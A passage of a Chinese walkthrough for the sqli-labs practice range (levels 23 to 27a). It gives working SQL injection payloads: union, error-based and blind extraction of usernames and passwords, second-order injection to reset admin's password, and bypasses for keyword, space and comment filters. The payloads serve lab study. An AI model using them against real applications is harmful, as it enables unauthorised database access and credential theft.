![1790491001732-ea5f2469-ffda-4cb6-a6ca-26e249127312.png](./img/285943702/1790491001732-ea5f2469-ffda-4cb6-a6ca-26e249127312-924933.png)

![1790491085791-fde9b11f-2ac1-4aef-bf07-5f186642c38f.png](./img/285943702/1790491085791-fde9b11f-2ac1-4aef-bf07-5f186642c38f-506529.png)

**3）用闭合代替注释**

思路：让语句在逻辑上完整，末尾再用 `'` 闭合原 SQL 的引号。

```latex
?id=1' and '1'='1
?id=1' and '1'='2
```

前者正常、后者异常 → 布尔可用，且无需注释。

![1790491163854-d0d218d5-ab21-48ca-bd26-692404978e45.png](./img/285943702/1790491163854-d0d218d5-ab21-48ca-bd26-692404978e45-037797.png)

![1790491198226-faf2c184-cb21-4621-b294-d17d445de8f0.png](./img/285943702/1790491198226-faf2c184-cb21-4621-b294-d17d445de8f0-724256.png)

**4）联合查询（注意末尾闭合）**

列数以本地 `order by` 为准。示例（3 列时）：

```latex
?id=-1' union select 1,2,3 and '1'='1
```

或：

```latex
?id=-1' union select 1,2,3'
```

![1790491649108-b2406148-ac8a-410c-8105-3127f01dd617.png](./img/285943702/1790491649108-b2406148-ac8a-410c-8105-3127f01dd617-640736.png)

到第 4 列的时候出现报错，说明列数只有 3 列。

![1790491667341-313fd129-60fa-4841-8a1a-21bf6c3c2817.png](./img/285943702/1790491667341-313fd129-60fa-4841-8a1a-21bf6c3c2817-544931.png)

读库名：

```latex
?id=-1' union select 1,database(),3 and '1'='1
```

![1790491730773-d5245c66-04e2-4b98-9116-6124227fe84b.png](./img/285943702/1790491730773-d5245c66-04e2-4b98-9116-6124227fe84b-124549.png)

读表名：

```latex
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' and '1'='1
```

![1790491811589-ffc35b16-dbcb-440b-9dab-62000b29d876.png](./img/285943702/1790491811589-ffc35b16-dbcb-440b-9dab-62000b29d876-013264.png)

读列名：

```latex
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' and '1'='1
```

![1790491916654-344229c4-3d4a-4063-ac94-664ceba86941.png](./img/285943702/1790491916654-344229c4-3d4a-4063-ac94-664ceba86941-707312.png)

读数据：

```latex
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users where '1'='1
```

或

```latex
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users where 1=1 and '1'='1
```

![1790492774977-321bd83b-10b2-47fb-a389-746e4757ad39.png](./img/285943702/1790492774977-321bd83b-10b2-47fb-a389-746e4757ad39-022446.png)

**5）报错注入（同样要闭合尾部）**

```latex
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1
```

```latex
?id=1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '1'='1
```

![1790492949710-3bf4724e-51fb-4f21-bb5f-746b40946369.png](./img/285943702/1790492949710-3bf4724e-51fb-4f21-bb5f-746b40946369-946537.png)

![1790492977933-90b0785b-4150-4bf1-ab7c-51648b2c9cd9.png](./img/285943702/1790492977933-90b0785b-4150-4bf1-ab7c-51648b2c9cd9-066918.png)

**6）可选：**`%00`\*\* 截断（视 MySQL/PHP 版本）\*\*

部分环境可用：

```latex
?id=-1' union select 1,database(),3;%00
```

不稳定时仍以对称闭合为准。

![1790493125244-53933827-10fa-4a18-843b-411b20abe3fc.png](./img/285943702/1790493125244-53933827-10fa-4a18-843b-411b20abe3fc-803798.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心 | 注释被删，不能靠 `--` / `#` |
| 绕过 | 末尾 `and '1'='1` 或补一个 `'` |
| 列数 | 务必本地 `order by` 实测 |

***

### Less-24：二次注入（注册 + 改密）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-24/` |
| 类型 | **二次注入（Second Order）** |
| 流程 | 注册用户名带恶意片段 → 入库时转义 → 改密码时取出用户名**未再转义**拼进 UPDATE |
| 关键限制 | 用户名长度常有上限（如约 20 字符），payload 要短 |

#### 源码逻辑（理解用）

1. **注册**：用户名可能经 `addslashes` / `mysql_real_escape_string` 后写入，单引号被转义，注册阶段不一定报错。
2. **登录**：用该账号登录成功。
3. **改密码**：`UPDATE ... WHERE username='$取出的用户名'`。取出的是库里的原始值（含 `'`），若取出后不再转义，就会构成二次注入。

#### 解题步骤

**1）注册恶意用户名**

注册一个用户名类似：

```latex
admin'#
```

或（视长度与过滤）：

```latex
admin'--
```

密码自己设定（如 `123456`）。若 `admin` 已存在，可用：

```latex
admin' #
```

注意空格、长度限制；以能注册成功为准。

![1790493935867-39fd899b-d27d-473f-9ac5-afd8a3cd5825.png](./img/285943702/1790493935867-39fd899b-d27d-473f-9ac5-afd8a3cd5825-977427.png)

**原理**：库中存的是带 `'` 的用户名。改密时 SQL 可能变成：

```sql
UPDATE users SET password='新密码' WHERE username='admin'# ....'
```

`#` 后被注释，条件变成只匹配 `admin`，从而改的是 **admin** 的密码，而不是你的马甲号。

**2）用刚注册的账号登录**

用户名填注册时的完整字符串，密码填你设的密码。

![1790494064700-44e66d8c-e488-436b-957a-5fc4b6872f0d.png](./img/285943702/1790494064700-44e66d8c-e488-436b-957a-5fc4b6872f0d-092414.png)

**3）进入改密页面，修改密码**

把密码改成你想控制的值（如 `hacked`），提交。

若二次注入成功，实际被改的是 `admin`**（或被注释掉后面条件后的目标用户）** 的密码。

![1790494127160-d6028e5e-8a81-472d-bfc0-8f63eb291eae.png](./img/285943702/1790494127160-d6028e5e-8a81-472d-bfc0-8f63eb291eae-729637.png)

![1790494150175-f1dfd69d-4bff-4b81-8550-29e9e8cca068.png](./img/285943702/1790494150175-f1dfd69d-4bff-4b81-8550-29e9e8cca068-412794.png)

**4）验证**

退出后，用 `admin` + 你刚设的新密码登录。能进则说明二次注入成立。

![1790494188174-81e73601-c11e-44e2-9787-428866675572.png](./img/285943702/1790494188174-81e73601-c11e-44e2-9787-428866675572-344297.png)

![1790494196790-065c5fc1-f72b-4344-9ac4-ea5125a18e3c.png](./img/285943702/1790494196790-065c5fc1-f72b-4344-9ac4-ea5125a18e3c-130634.png)

**5）其他利用思路（进阶）**

在长度允许时，用户名中可尝试更复杂的片段，使二次使用点执行报错/联合（本关重点是理解「写入转义、使用未转义」）。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与前面关卡 | 不是一次请求打穿，而是「存一次、用一次」 |
| 防御对照 | 入库转义不够；**每次**拼 SQL 都要参数化 |
| 注意 | 用户名长度限制、是否允许 `#` 等字符 |

***

### Less-25：GET · 过滤 `or` / `and` · 单引号

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-25/?id=1` |
| 注入方式 | GET |
| 闭合 | 单引号 `'` |
| 过滤内容 | `or`、`and`（不区分大小写，替换为空） |
| 有无报错回显 | 有 |
| 主攻手法 | 双写绕过 / `||` `&&` 替代；联合或报错 |

#### 源码逻辑（理解用）

```latex
preg_replace('/or/i', "", $id);
preg_replace('/and/i', "", $id);  // 或 /AND/i 等
```

一次匹配删除，**双写**后删掉中间仍能拼回完整关键字；也可用逻辑运算符代替。

#### 解题步骤

**1）确认过滤**

```latex
?id=1' and 1=1--+
?id=1' or 1=1--+
```

`and`/`or` 被挖空导致语句异常。

![1790495603052-7e58386f-a331-4e9f-8a18-e1ee17bce5fb.png](./img/285943702/1790495603052-7e58386f-a331-4e9f-8a18-e1ee17bce5fb-510985.png)

![1790495622873-a5e49020-f1af-4077-b606-b50a6f12dbd6.png](./img/285943702/1790495622873-a5e49020-f1af-4077-b606-b50a6f12dbd6-041514.png)

**2）双写绕过**

```latex
?id=1' anandd 1=1--+
?id=1' oorr 1=1--+
```

过滤去掉一层 `and`/`or` 后，剩下 `and`/`or`。

![1790495661358-48675c3f-86d8-46ae-8b68-2a619338ba11.png](./img/285943702/1790495661358-48675c3f-86d8-46ae-8b68-2a619338ba11-948218.png)

![1790495691603-7f62b0c1-0c0b-4194-b54b-74030007d496.png](./img/285943702/1790495691603-7f62b0c1-0c0b-4194-b54b-74030007d496-721848.png)

**3）符号替代**

```latex
?id=1' && 1=1--+
?id=1' || 1=1--+
```

URL 中 `&` 需编码：

```latex
?id=1'%26%26 1=1--+
?id=1'%7c%7c 1=1--+
```

![1790495796104-8066d162-5fc4-4935-a766-29864686a9ae.png](./img/285943702/1790495796104-8066d162-5fc4-4935-a766-29864686a9ae-296785.png)

![1790495818440-13604fa5-92f5-4c73-b5d4-78f953075c31.png](./img/285943702/1790495818440-13604fa5-92f5-4c73-b5d4-78f953075c31-185260.png)

**4）联合查询**

```latex
?id=-1' ununionion select 1,2,3--+
```

（若本关未过滤 union/select，直接 `union select` 即可；`ununionion` 为保险双写。）

![1790495942771-e31560a3-d13f-4aee-92b3-5458b251fde2.png](./img/285943702/1790495942771-e31560a3-d13f-4aee-92b3-5458b251fde2-287719.png)

列数本地实测。取数据示例：

```latex
?id=-1' union select 1,database(),3--+
?id=-1' union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database() --+
?id=-1' union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema='security' anandd table_name='users' --+
?id=-1' union select 1,group_concat(username,0x3a,passwoorrd),3 from users--+
```

![1790495968865-df9cbe76-b253-4918-bcac-9d7a9d759804.png](./img/285943702/1790495968865-df9cbe76-b253-4918-bcac-9d7a9d759804-357621.png)

![1790496356670-2c3ee225-0d58-40b8-8456-e7df8db2cf7d.png](./img/285943702/1790496356670-2c3ee225-0d58-40b8-8456-e7df8db2cf7d-563184.png)

![1790496454183-236a61ce-863f-4fd1-8cc8-2dcee9be4eb2.png](./img/285943702/1790496454183-236a61ce-863f-4fd1-8cc8-2dcee9be4eb2-195705.png)

![1790496522297-036c2706-9acc-48b7-9ad7-54a3dc912f0c.png](./img/285943702/1790496522297-036c2706-9acc-48b7-9ad7-54a3dc912f0c-714826.png)

**5）报错注入（绕过 and）**

```latex
?id=1' anandd updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

或：

```latex
?id=1' %26%26 updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

注意：`information_schema` 中含 `or`（如 `information_schema`），可能被拆坏，可用双写：`infoorrmation_schema`，或改用 `database()`、直接查 `users`。

![1790496614263-31336f76-ee7f-456b-b8a4-dca93266d999.png](./img/285943702/1790496614263-31336f76-ee7f-456b-b8a4-dca93266d999-863329.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 过滤 | 大小写不敏感的 `or`/`and` |
| 绕过 | 双写、`||`、`&&` |
| 坑 | 库名/表名字符串里的 `or` 也可能被删 |

***

### Less-25a：GET · 过滤 or / and · 数字型 · 盲注倾向

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | /Less-25a/?id=1 |
| 注入方式 | GET |
| 类型 | **数字型**（SQL 中 id 一般无引号包裹） |
| 过滤内容 | 与 Less-25 类似：or、and（不区分大小写，替换为空） |
| 与 Less-25 的差异 | 多为整型；页面常**不回显详细 MySQL 报错**，联合/报错不一定好用，偏向**布尔或时间盲注** |
| 典型 SQL 形态 | SELECT \* FROM users WHERE id=$id LIMIT 0,1 |

#### 源码逻辑（理解用）

黑名单去掉 or/and 后直接拼进数字条件。没有字符闭合负担，但关键字被挖空后，and 1=1 会变成残缺语句，需双写或改用 && / ||。

#### 解题步骤

**1）确认数字型与过滤**

```plain
?id=1
?id=1'
?id=1 and 1=1
?id=1 and 1=2
```

* 加单引号不一定是“字符型特征”；本关重点看 **and/or 是否被删**
* and 失效时，试双写或编码后的 &&

![1790497627568-7eb361fa-2fbc-4a8e-9414-b973cc066e75.png](./img/285943702/1790497627568-7eb361fa-2fbc-4a8e-9414-b973cc066e75-809635.png)

![1790497614811-cf230ee0-f298-4aca-af0e-6dcc8f70d841.png](./img/285943702/1790497614811-cf230ee0-f298-4aca-af0e-6dcc8f70d841-505302.png)

**2）绕过 and / or**

双写：

```plain
?id=1 aandnd 1=1
?id=1 aandnd 1=2
```

或：

```plain
?id=1 %26%26 1=1
?id=1 %26%26 1=2
```

真假页有差异 → 可做布尔盲注。

![1790497660943-05607a72-c73a-4d01-bfc4-4e8bd967a209.png](./img/285943702/1790497660943-05607a72-c73a-4d01-bfc4-4e8bd967a209-379656.png)

![1790497685057-e1cfbc78-e27a-4dad-90b3-76d457e86933.png](./img/285943702/1790497685057-e1cfbc78-e27a-4dad-90b3-76d457e86933-201474.png)

**3）若环境仍有联合回显**

列数以本地为准。示例：

```plain
?id=-1 union select 1,2,3
?id=-1 union select 1,database(),3
?id=-1 union select 1,group_concat(username,0x3a,passwoorrd),3 from users
```

说明：password 含 or，可能被滤成 passwrd，需写成 **passwoorrd**（双写 or）。

![1790497820970-23f1ca92-1618-472f-bb92-2c802c09827f.png](./img/285943702/1790497820970-23f1ca92-1618-472f-bb92-2c802c09827f-594448.png)

![1790497837499-789d67c7-4546-4257-b207-bf899f746590.png](./img/285943702/1790497837499-789d67c7-4546-4257-b207-bf899f746590-938379.png)

![1790497871190-334b562a-f80d-4f35-a60b-a4fc00c7f992.png](./img/285943702/1790497871190-334b562a-f80d-4f35-a60b-a4fc00c7f992-499989.png)

**4）布尔盲注猜库名**

```plain
?id=1 aandnd length(database())=8
?id=1 aandnd substr(database(),1,1)='s'
```

或：

```plain
?id=1 %26%26 length(database())=8
?id=1 %26%26 ascii(substr(database(),1,1))=115
```

![1790497950280-42ac88ab-3f64-461a-a717-a18d277e644e.png](./img/285943702/1790497950280-42ac88ab-3f64-461a-a717-a18d277e644e-517278.png)

![1790498023964-0db9ea81-c1b9-4116-b6c2-3f778c5bec4a.png](./img/285943702/1790498023964-0db9ea81-c1b9-4116-b6c2-3f778c5bec4a-899733.png)

**5）时间盲注备选**

```plain
?id=1 aandnd if(length(database())=8,sleep(5),0)
?id=1 %26%26 if(substr(database(),1,1)='s',sleep(5),0)
```

这里如果出现等待的时候是 5 秒，就说明是成功的。

![1790499511161-406f98ea-2904-455a-b311-286e8f0e365e.png](./img/285943702/1790499511161-406f98ea-2904-455a-b311-286e8f0e365e-283149.png)

![1790499638933-a7ad75f6-a55d-43a1-b8e5-ff8dbe7a868c.png](./img/285943702/1790499638933-a7ad75f6-a55d-43a1-b8e5-ff8dbe7a868c-085682.png)

如果出现等待的时候很快，就说明不时间盲注不成功。

![1790499540503-282a637b-40dd-4d16-af65-4526935c429e.png](./img/285943702/1790499540503-282a637b-40dd-4d16-af65-4526935c429e-877362.png)

**6）查表、列、数据**

在盲注条件中替换子查询即可；涉及 information_schema 时注意其中的 or，可用双写：

```plain
infoorrmation_schema
```

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-25 | 过滤相同思路；本关偏整型 + 弱报错 |
| 绕过 | aandnd / oorr / %26%26 / %7c%7c |
| 坑 | 字段名 password、库名路径里的 or |

***

### Less-26：GET · 过滤空格、注释、`or`/`and` 等

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-26/?id=1` |
| 闭合 | 单引号 `'` |
| 过滤内容 | 空格类空白、`/*`、`--`、`#`、`or`、`and`、部分斜杠等 |
| 有无报错回显 | 有（便于报错注入） |
| 主攻手法 | 空白符替代 + 双写/逻辑符 + 括号省空格 + 尾部闭合 |

#### 源码逻辑（理解用）

在 Less-25 基础上进一步去掉空白和注释，导致：

* 不能写普通空格分隔的 `union select`
* 不能用 `--` / `#` 注释尾巴

#### 解题步骤

**1）确认过滤**

```latex
?id=1'
?id=1' and 1=1--+
```

空格、and、注释均可能失效。

![1790505206520-0208fba3-e0a6-4771-817d-df6978758a07.png](./img/285943702/1790505206520-0208fba3-e0a6-4771-817d-df6978758a07-768550.png)

![1790505226253-6ce29413-6e94-4139-87a6-2b8d632a7615.png](./img/285943702/1790505226253-6ce29413-6e94-4139-87a6-2b8d632a7615-617630.png)

**2）空白绕过**

用其它分隔代替空格，常见：

| 替代 | URL 写法 | 说明 |
| --- | --- | --- |
| 换行 | `%0a` | 常用 |
| 空格 | `%a0` | 常用 |
| 制表符 | `%09` | 常用 |
| 垂直制表 | `%0b` | 视环境 |
| `/**/` | 本关常被过滤 `/*` | 可能无效 |

**3）or/and 绕过**

同 Less-25：双写或 `||` / `&&`（`%7c%7c` / `%26%26`）。

**4）注释绕过**

用尾部对称闭合：

```latex
... || '1'='1

?id=1'%0a||%0a'1'='1
```

![1790505397576-87c6d593-7993-43b1-8338-965a71485550.png](./img/285943702/1790505397576-87c6d593-7993-43b1-8338-965a71485550-258744.png)

**5）报错注入示例（少空格）**

括号可减少对空格的依赖：

```latex
?id=1' || updatexml(1,concat(0x7e,database(),0x7e),1) || '
```

或：

```latex
?id=1'%0a||%0aupdatexml(1,concat(0x7e,database(),0x7e),1)%0a||%0a'
```

![1790506311017-ef63dd59-ebac-4bdb-b329-4b19e260f20a.png](./img/285943702/1790506311017-ef63dd59-ebac-4bdb-b329-4b19e260f20a-131315.png)

![1790506497278-069bbc33-e08f-4206-bd2d-ee42cdda44ac.png](./img/285943702/1790506497278-069bbc33-e08f-4206-bd2d-ee42cdda44ac-038498.png)

**6）联合查询示例**

这里本地靶场不能复现，在线靶场可以复现，可能是和部署的环境有关系，用 Linux 去部署可能就能复现。

```latex
?id=111' union%a0select%a01,2,3%a0%26%26'1'='1

?id=111' union%a0select%a01,database(),3%a0%26%26'1'='1

?id=111' union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema='security'%a0%26%26'1'='1

?id=111' union%a0select%a01,group_concat(column_name),3%a0 from%a0infoorrmation_schema.columns%a0where%a0table_name='users'%a0%26%26'1'='1
```

若 `or` 被过滤影响 `information_schema`：

```latex
?id=111' union%a0select%a01,group_concat(username,0x3a,passwoorrd),3%a0from%a0users%a0where%a0'1'='1
```

![1790679406699-589de9e6-a5ac-47a1-b69a-7fa0a698da0d.png](./img/285943702/1790679406699-589de9e6-a5ac-47a1-b69a-7fa0a698da0d-875760.png)

![1790679880828-8a6f8a40-8c7e-4d16-9558-220e45438d7d.png](./img/285943702/1790679880828-8a6f8a40-8c7e-4d16-9558-220e45438d7d-418740.png)

![1790681417344-d77ff26b-da58-4c80-ade0-a4f0cd8b0b41.png](./img/285943702/1790681417344-d77ff26b-da58-4c80-ade0-a4f0cd8b0b41-675958.png)

![1790682040417-36034afe-c7d9-4b06-9ff0-c7ec9d43dc41.png](./img/285943702/1790682040417-36034afe-c7d9-4b06-9ff0-c7ec9d43dc41-225870.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 组合过滤 | 空格 + 注释 + and/or |
| 关键技术 | `%0a`/`%09` + `||` + 尾部 `'...'` |
| 优先 | 报错注入往往比联合更好写 |

***

### Less-26a：GET · 过滤空格 / 注释 / or/and · ') 闭合 · 盲注

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | /Less-26a/?id=1 |
| 注入方式 | GET |
| 闭合 | **')**（单引号 + 右括号） |
| 过滤内容 | 与 Less-26 类似：空白、/\*、--、#、or、and 等 |
| 与 Less-26 的差异 | ① 闭合多为 ')；② **常无详细报错**，报错注入困难，主攻布尔/时间盲注 |
| 典型 SQL 形态 | SELECT \* FROM users WHERE id=('$id') LIMIT 0,1 |

#### 源码逻辑（理解用）

$id 落在 ('$id') 中，过滤后又无法用 --/# 注释掉尾巴，因此需要：

* 开头用 ') 闭合
* 结尾用 ('1 或 ||'1'='1 一类方式把后面的 ') 接住
* 空格用 %0a / %09 / %a0 等替代
* and/or 用双写或 &&/||

#### 解题步骤

**1）确认闭合与真假**

```plain
?id=1'
?id=1')
?id=1')%26%26(1=1)%26%26('1
?id=1')%26%26(1=2)%26%26('1
```

或：

```plain
?id=1')%0a%26%26%0a(1=1)%0a%26%26%0a('1'='1
```

能区分成功/失败页即可。

![1790683244980-5fd5a513-3062-4407-a89f-a275ec7eb97f.png](./img/285943702/1790683244980-5fd5a513-3062-4407-a89f-a275ec7eb97f-013999.png)

![1790683257935-8b8a4e25-03ec-4680-bb0c-cb9760cad39b.png](./img/285943702/1790683257935-8b8a4e25-03ec-4680-bb0c-cb9760cad39b-811201.png)

![1790683425229-ec9d483b-b93e-4a1e-b399-d257ba5c581e.png](./img/285943702/1790683425229-ec9d483b-b93e-4a1e-b399-d257ba5c581e-920722.png)

**2）可选 %00 截断（视环境）**

```plain
?id=1')%26%26(1=1);%00
?id=1')%26%26(1=2);%00
```

无效则坚持对称闭合，不依赖 %00。

![1790683571047-95201db3-90f5-4b09-aa74-98720336d486.png](./img/285943702/1790683571047-95201db3-90f5-4b09-aa74-98720336d486-439917.png)

![1790683585121-b1c9fbe8-4c81-459f-a49c-cfb5df5bcb2e.png](./img/285943702/1790683585121-b1c9fbe8-4c81-459f-a49c-cfb5df5bcb2e-913390.png)

**3）布尔盲注猜库名长度**

```plain
?id=1')%26%26(length(database())=8)%26%26('1
```

![1790683639278-68ca4ef6-d695-436f-ab0c-af8e95863b18.png](./img/285943702/1790683639278-68ca4ef6-d695-436f-ab0c-af8e95863b18-891845.png)

**4）逐字符猜库名**

```plain
?id=1')%26%26(substr(database(),1,1)='s')%26%26('1
?id=1')%26%26(ascii(substr(database(),1,1))=115)%26%26('1
```

空格被过滤时，用括号包住函数调用，减少空格：

```plain
?id=1')%26%26(substr(database(),1,1)='s')%26%26('1
```

![1790683797874-85244f4b-b9e9-4579-b618-a5211b36c339.png](./img/285943702/1790683797874-85244f4b-b9e9-4579-b618-a5211b36c339-715544.png)

![1790683899911-7243514a-0f5d-4dcc-838e-d1969c178616.png](./img/285943702/1790683899911-7243514a-0f5d-4dcc-838e-d1969c178616-989472.png)

**5）时间盲注**

```plain
?id=1')%26%26(if(length(database())=8,sleep(5),0))%26%26('1
?id=1')%26%26(if(substr(database(),1,1)='s',sleep(5),0))%26%26('1
```

![1790684081995-3e98ee4f-013f-464d-b997-73d4cfb4af03.png](./img/285943702/1790684081995-3e98ee4f-013f-464d-b997-73d4cfb4af03-322443.png)

![1790684144139-42b58f09-1be9-40d6-afe7-c66ac6d7c0d8.png](./img/285943702/1790684144139-42b58f09-1be9-40d6-afe7-c66ac6d7c0d8-357017.png)

**6）联合查询（若偶然有回显）**

```plain
?id=111')%a0union%a0select%a01,2,3%a0%26%26%0a('1

?id=111')%a0union%a0select%a01,database(),3%a0%26%26%0a('1

?id=111')%a0union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%a0%26%26%0a('1

?id=111')%a0union%a0select%a01,group_concat(column_name),3%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=database()%a0anandd%a0table_name='users'%a0%26%26%0a('1

?id=111')%a0union%a0select%a01,group_concat(username,0x3a,passwoorrd),3%a0from%a0users%a0where%a0('1
```

多数 26a 环境以盲注为主，不必强求 union。

![1790684556322-26fa3b39-de07-4926-a12a-e90ea630c8cc.png](./img/285943702/1790684556322-26fa3b39-de07-4926-a12a-e90ea630c8cc-833517.png)

![1790685532725-9746c85c-24b4-4c73-821f-3666e086dfa7.png](./img/285943702/1790685532725-9746c85c-24b4-4c73-821f-3666e086dfa7-610274.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-26 | 过滤同类；本关 ') + 弱报错 |
| 结构 | ') + 条件 + ('1 或等价闭合 |
| 空白 | %0a / %09 / 括号减少空格 |
| and/or | %26%26 / %7c%7c / 双写 |

***

### Less-27：GET · 过滤 `union` / `select` 与空格、注释

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-27/?id=1` |
| 闭合 | 单引号 `'` |
| 过滤内容 | 空格、`/*`、`--`、`#`，以及多种大小写的 `union`/`select`（具体以源码为准，多为**按固定大小写模式**删除，不是完美的 `/i`） |
| 有无报错回显 | 多数情况有 |
| 主攻手法 | 大小写混写 / 双写打乱关键字；空白用 `%0a` 等；尾部闭合 |

#### 源码逻辑（理解用）

黑名单多次 `preg_replace` 去掉 `union`、`select`、`UNION`、`SELECT`、`Union`、`Select` 等，以及空格和注释。若未覆盖所有大小写组合，可用 `UnIoN`\*\* / \*\*`sElEcT` 绕过；也可用双写 `ununionion`、`selselectect`。

#### 解题步骤

**1）确认过滤**

```latex
?id=1' union select 1,2,3--+
```

关键字或空格被删导致失败。

![1790686412713-76a4f8c2-5ea8-4269-bb78-80098fef0f85.png](./img/285943702/1790686412713-76a4f8c2-5ea8-4269-bb78-80098fef0f85-222728.png)

**2）绕过 union / select**

尝试大小写混写：

```latex
?id=-1'%0aUNiON%0aSELeCT%0a1,2,3%0a||%0a'1'='1
```

或双写（<font style="color:rgb(34, 34, 38);">这关 select 没法双写绕过，三写就可以绕过了</font>）：

```latex
?id=-1'%0aununionion%0aselselselectectect%0a1,2,3%0a||%0a'1'='1
```

![1790686680934-e91aacb2-f40b-482a-8ba2-bea98e45066c.png](./img/285943702/1790686680934-e91aacb2-f40b-482a-8ba2-bea98e45066c-249418.png)

![1790687363243-77cf4e68-8eb0-4ce6-8d72-79b45559367e.png](./img/285943702/1790687363243-77cf4e68-8eb0-4ce6-8d72-79b45559367e-077062.png)

**3）读库名**

```latex
?id=111'%0aUNiON%0aSELeCT%0a1,2,3%0a||%0a'1'='1

?id=111'%0aUNiON%0aSELeCT%0a1,database(),3%0a||%0a'1'='1

?id=111'%0aUNiON%0aSELeCT%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0a%26%26%0a'1'='1

?id=111'%0aUNiON%0aSELeCT%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0a%26%26%0atable_name='users'%0a%26%26%0a'1'='1
```

![1790687691015-a5026b8b-5d49-46c0-8647-a66c05cbf165.png](./img/285943702/1790687691015-a5026b8b-5d49-46c0-8647-a66c05cbf165-296864.png)

![1790687675591-8a7169c1-215f-4ba6-a04b-9a129f278d5a.png](./img/285943702/1790687675591-8a7169c1-215f-4ba6-a04b-9a129f278d5a-348185.png)

**4）读数据**

```latex
?id=111'%0aUNiON%0aSELeCT%0a1,group_concat(username,0x3a,password),3%0afrom%0ausers%0awhere%0a'1'='1
```

![1790688135785-58991217-20e7-4d38-a088-4fabcfd34f1e.png](./img/285943702/1790688135785-58991217-20e7-4d38-a088-4fabcfd34f1e-390580.png)

**5）报错注入（减少对 union 的依赖）**

```latex
?id=1'||updatexml(1,concat(0x7e,database(),0x7e),1)||'
```

子查询里若必须写 `select`，同样做大小写/双写：

```latex
?id=1'||updatexml(1,concat(0x7e,(sElEcT%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x7e),1)||'

?id=1'||updatexml(1,concat(0x7e,(sElEcT%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users'),0x7e),1)||'

?id=1'||updatexml(1,concat(0x7e,(sElEcT%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users'),0x7e),1)||'

?id=1'||updatexml(1,concat(0x7e,(sElEcT%0agroup_concat(username,0x3a,password)%0afrom%0ausers),0x7e),1)||'
```

若 `select` 仍被剥，继续双写 `selselectect`。

![1790688852781-0f902123-c824-40ec-83c6-614a596d1c20.png](./img/285943702/1790688852781-0f902123-c824-40ec-83c6-614a596d1c20-189298.png)

![1790689056181-b5b67d4f-2699-485d-8b5c-a051bc5df461.png](./img/285943702/1790689056181-b5b67d4f-2699-485d-8b5c-a051bc5df461-787073.png)

![1790689232660-44de3cae-1727-40ce-9d8e-b3ce10c01879.png](./img/285943702/1790689232660-44de3cae-1727-40ce-9d8e-b3ce10c01879-710242.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 过滤重点 | `union` + `select` + 空白 + 注释 |
| 绕过 | 混写大小写、双写、`%0a`、尾部闭合 |
| 建议 | 先报错拿 `database()`，再决定是否硬刚 union |

***

### Less-27a：GET · 过滤 union / select · 双引号 · 盲注

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | /Less-27a/?id=1 |
| 注入方式 | GET |
| 闭合 | **双引号 \*\*\*\*"**（部分环境为其它，以本地为准） |
| 过滤内容 | 与 Less-27 类似：空格、注释，以及多种形式的 union/select |
| 与 Less-27 的差异 | **无可靠报错/联合回显**，以布尔或时间盲注为主 |
| 典型 SQL 形态 | ... WHERE id="$id" ... 或带括号变体 |

#### 源码逻辑（理解用）

关键字过滤与 27 相近（按大小写模式删 union/select 等）。页面不把 SQL 错误和字段打出来，只能根据“有数据 / 无数据”或延时判断。

#### 解题步骤

**1）确认闭合**

```plain
?id=1'
?id=1"
?id=1"%26%26"1"="1
?id=1"%26%26"1"="2
```

双引号真假可区分 → 按 " 构造。

![1790858564911-282811b2-086f-4569-a4f7-1b6a72e1c623.png](./img/285943702/1790858564911-282811b2-086f-4569-a4f7-1b6a72e1c623-962051.png)

![1790858611283-74cd9d6d-841f-4d3d-9935-dece7e4675ee.png](./img/285943702/1790858611283-74cd9d6d-841f-4d3d-9935-dece7e4675ee-845914.png)

![1790858635832-2017fec5-533e-4009-ba8e-773261533da0.png](./img/285943702/1790858635832-2017fec5-533e-4009-ba8e-773261533da0-290621.png)

**2）绕过空格与注释**

* 空格 → %0a、%09
* 注释不可用 → 尾部 "1"="1 对称闭合

**3）绕过 union / select（盲注里若用到子查询）**

子查询中的 select 需混写或双写，例如：

```plain
sElEcT
selselselectectect
```

**4）布尔盲注**

```plain
?id=1"%0a%26%26%0alength(database())=8%0a%26%26%0a"1"="1
?id=1"%0a%26%26%0asubstr(database(),1,1)='s'%0a%26%26%0a"1"="1
```

![1790858769948-24e4ce97-6c77-4cdd-86a6-e2b5dadee353.png](./img/285943702/1790858769948-24e4ce97-6c77-4cdd-86a6-e2b5dadee353-869043.png)

